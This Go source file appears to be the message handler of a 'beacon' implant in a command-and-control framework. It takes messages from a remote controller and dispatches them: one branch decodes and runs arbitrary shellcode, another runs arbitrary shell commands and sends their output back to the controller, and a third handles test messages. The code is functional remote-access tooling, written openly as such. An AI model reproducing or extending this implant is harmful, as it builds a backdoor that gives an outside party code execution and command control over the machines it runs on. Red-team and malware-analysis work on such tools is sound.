package beacon

import (
	"bytes"
	"context"
	"fmt"
	"sync"

	"github.com/davecgh/go-spew/spew"
	"github.com/vmihailenco/msgpack/v4"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/module/shell"
	"project/internal/module/shellcode"
	"project/internal/protocol"
	"project/internal/xpanic"
)

type handler struct {
	ctx *Beacon

	context context.Context
	cancel  context.CancelFunc
	wg      sync.WaitGroup
}

func newHandler(ctx *Beacon) *handler {
	h := handler{
		ctx: ctx,
	}
	h.context, h.cancel = context.WithCancel(context.Background())
	return &h
}

func (h *handler) Cancel() {
	h.cancel()
}

func (h *handler) Close() {
	h.wg.Wait()
	h.ctx = nil
}

func (h *handler) logf(lv logger.Level, format string, log ...interface{}) {
	h.ctx.logger.Printf(lv, "handler", format, log...)
}

func (h *handler) log(lv logger.Level, log ...interface{}) {
	h.ctx.logger.Println(lv, "handler", log...)
}

// logfWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo logf
// spew output...
//
// first log interface must be *protocol.Send
func (h *handler) logfWithInfo(lv logger.Level, format string, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintf(buf, format, log[1:]...)
	buf.WriteString("\n")
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(lv, "handler", buf)
}

// logWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo log
// spew output...
//
// first log interface must be *protocol.Send
func (h *handler) logWithInfo(lv logger.Level, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintln(buf, log[1:]...)
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(lv, "handler", buf)
}

// logPanic must use like defer h.logPanic("title")
func (h *handler) logPanic(title string) {
	if r := recover(); r != nil {
		h.log(logger.Fatal, xpanic.Print(r, title))
	}
}

func (h *handler) OnMessage(send *protocol.Send) {
	defer h.logPanic("handler.OnMessage")
	if len(send.Message) < 4 {
		const log = "controller send with invalid size"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	msgType := convert.BytesToUint32(send.Message[:4])
	send.Message = send.Message[4:]
	switch msgType {
	case messages.CMDExecuteShellCode:
		h.handleExecuteShellCode(send)
	case messages.CMDShell:
		h.handleShell(send)
	case messages.CMDTest:
		h.handleSendTestMessage(send)
	default:
		const format = "controller send unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(send))
	}
}

func (h *handler) handleExecuteShellCode(send *protocol.Send) {
	defer h.logPanic("handler.handleExecuteShellCode")
	es := new(messages.ExecuteShellCode)
	err := msgpack.Unmarshal(send.Message, es)
	if err != nil {
		const log = "controller send invalid shellcode"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	go func() {
		// add interrupt to execute wg.Done
		err = shellcode.Execute(es.Method, es.ShellCode)
		if err != nil {
			// send execute error
			fmt.Println("--------------", err)
		}
	}()
}

func (h *handler) handleShell(send *protocol.Send) {
	defer h.logPanic("handler.handleShell")
	s := new(messages.Shell)
	err := msgpack.Unmarshal(send.Message, s)
	if err != nil {
		const log = "controller send invalid shell"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	go func() {
		// add interrupt to execute wg.Done
		output, err := shell.Shell(s.Command)
		if err != nil {
			// send execute error
			return
		}

		so := messages.ShellOutput{
			Output: output,
		}
		err = h.ctx.sender.Send(h.context, messages.CMDBShellOutput, &so)
		if err != nil {
			fmt.Println("failed to send:", err)
		}
	}()
}

func (h *handler) handleSendTestMessage(send *protocol.Send) {
	defer h.logPanic("handler.handleSendTestMessage")
	if !h.ctx.Test.testMsgEnabled {
		return
	}
	err := h.ctx.Test.AddSendTestMessage(h.context, send.Message)
	if err != nil {
		const log = "failed to add send test message\nerror:"
		h.logWithInfo(logger.Fatal, send, log, err)
	}
}
